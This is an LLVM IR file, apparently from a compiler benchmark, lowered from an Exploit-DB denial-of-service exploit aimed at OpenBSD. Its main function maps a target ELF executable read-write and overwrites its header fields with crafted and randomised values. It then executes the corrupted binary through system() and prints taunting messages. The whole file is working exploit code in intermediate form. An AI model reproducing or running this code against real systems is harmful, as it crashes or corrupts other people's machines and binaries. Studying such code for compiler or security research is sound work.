; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/dos/extr_36799.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/dos/extr_36799.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32 }
%struct.TYPE_3__ = type { i32, i32, i32 }
%struct.stat = type { i32 }

@.str = private unnamed_addr constant [22 x i8] c"Usage: %s <elf_exec>\0A\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@big_b00bz = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [23 x i8] c" .. I like b1g 0nez !!\00", align 1
@.str.3 = private unnamed_addr constant [17 x i8] c" .. want s0me ?!\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c" .. j00 like it ?!\00", align 1
@MS_ASYNC = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [56 x i8] c"... s0rry, this piece of sh1t didn't w0rk in j00r obsd\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.TYPE_4__*, align 8
  %7 = alloca %struct.TYPE_3__*, align 8
  %8 = alloca %struct.stat, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp ne i32 %11, 2
  br i1 %12, label %13, label %18

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 0
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i8* %16)
  store i32 %17, i32* %3, align 4
  br label %100

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  %22 = load i32, i32* @O_RDWR, align 4
  %23 = call i32 @open(i8* %21, i32 %22)
  store i32 %23, i32* %10, align 4
  %24 = load i32, i32* %10, align 4
  %25 = call i32 @fstat(i32 %24, %struct.stat* %8)
  %26 = getelementptr inbounds %struct.stat, %struct.stat* %8, i32 0, i32 0
  %27 = load i32, i32* %26, align 4
  %28 = load i32, i32* @PROT_READ, align 4
  %29 = load i32, i32* @PROT_WRITE, align 4
  %30 = or i32 %28, %29
  %31 = load i32, i32* @MAP_SHARED, align 4
  %32 = load i32, i32* %10, align 4
  %33 = call i64 @mmap(i32* null, i32 %27, i32 %30, i32 %31, i32 %32, i32 0)
  %34 = inttoptr i64 %33 to i8*
  store i8* %34, i8** %9, align 8
  %35 = load i8*, i8** %9, align 8
  %36 = bitcast i8* %35 to %struct.TYPE_4__*
  store %struct.TYPE_4__* %36, %struct.TYPE_4__** %6, align 8
  %37 = load i8*, i8** %9, align 8
  %38 = load %struct.TYPE_4__*, %struct.TYPE_4__** %6, align 8
  %39 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %37, i64 %41
  %43 = bitcast i8* %42 to %struct.TYPE_3__*
  store %struct.TYPE_3__* %43, %struct.TYPE_3__** %7, align 8
  %44 = load i8*, i8** @big_b00bz, align 8
  %45 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* %44)
  %46 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %47 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %46, i64 9
  %48 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %47, i32 0, i32 0
  store i32 2112859373, i32* %48, align 4
  %49 = call i32 (...) @arc4random()
  %50 = srem i32 %49, 2
  %51 = icmp ne i32 %50, 0
  %52 = zext i1 %51 to i64
  %53 = select i1 %51, i32 1094795585, i32 1128481603
  %54 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %55 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %54, i64 2
  %56 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %55, i32 0, i32 1
  store i32 %53, i32* %56, align 4
  %57 = call i32 (...) @arc4random()
  %58 = srem i32 %57, 3
  %59 = add nsw i32 3, %58
  %60 = call i32 @sleep(i32 %59)
  %61 = call i32 (...) @arc4random()
  %62 = srem i32 %61, 3
  %63 = icmp eq i32 %62, 2
  br i1 %63, label %64, label %66

64:                                               ; preds = %18
  %65 = call i32 @puts(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  br label %81

66:                                               ; preds = %18
  %67 = call i32 (...) @arc4random()
  %68 = srem i32 %67, 2
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %70, label %75

70:                                               ; preds = %66
  %71 = call i32 @puts(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0))
  %72 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %73 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %72, i64 5
  %74 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %73, i32 0, i32 2
  store i32 -1318387531, i32* %74, align 4
  br label %80

75:                                               ; preds = %66
  %76 = call i32 @puts(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0))
  %77 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %78 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %77, i64 5
  %79 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %78, i32 0, i32 2
  store i32 181294568, i32* %79, align 4
  br label %80

80:                                               ; preds = %75, %70
  br label %81

81:                                               ; preds = %80, %64
  %82 = load i8*, i8** %9, align 8
  %83 = load i32, i32* @MS_ASYNC, align 4
  %84 = call i32 @msync(i8* %82, i32 0, i32 %83)
  %85 = load i8*, i8** %9, align 8
  %86 = getelementptr inbounds %struct.stat, %struct.stat* %8, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = call i32 @munmap(i8* %85, i32 %87)
  %89 = load i32, i32* %10, align 4
  %90 = call i32 @close(i32 %89)
  %91 = call i32 (...) @arc4random()
  %92 = srem i32 %91, 3
  %93 = add nsw i32 3, %92
  %94 = call i32 @sleep(i32 %93)
  %95 = load i8**, i8*** %5, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 1
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @system(i8* %97)
  %99 = call i32 @puts(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.5, i64 0, i64 0))
  store i32 -553727362, i32* %3, align 4
  br label %100

100:                                              ; preds = %81, %13
  %101 = load i32, i32* %3, align 4
  ret i32 %101
}

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @fstat(i32, %struct.stat*) #1

declare dso_local i64 @mmap(i32*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @arc4random(...) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @puts(i8*) #1

declare dso_local i32 @msync(i8*, i32, i32) #1

declare dso_local i32 @munmap(i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
